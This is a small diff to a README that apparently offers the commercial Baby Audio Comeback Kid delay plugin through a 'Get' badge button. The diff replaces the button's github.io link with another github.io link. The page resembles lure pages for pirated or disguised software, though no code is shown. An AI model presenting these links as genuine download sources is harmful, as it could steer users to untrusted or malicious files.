@@ -21,7 +21,7 @@ To begin using this **Baby Audio Comeback Kid delay plugin** and **Baby Audio Co
 | :--- | :--- |
 | **Get Baby Audio Comeback Kid** | Click the button below to start using this **Baby Audio Comeback Kid audio plugin**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Baby_Audio_Comeback_Kid-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/baby-audio-comeback-kid)
+[![Comeback Kid](https://img.shields.io/badge/Access-Comeback%20Kid-059669?style=for-the-badge)](https://comeback-kid-vst.github.io/.github/comeback-kid)
 
 ## System Requirements
 
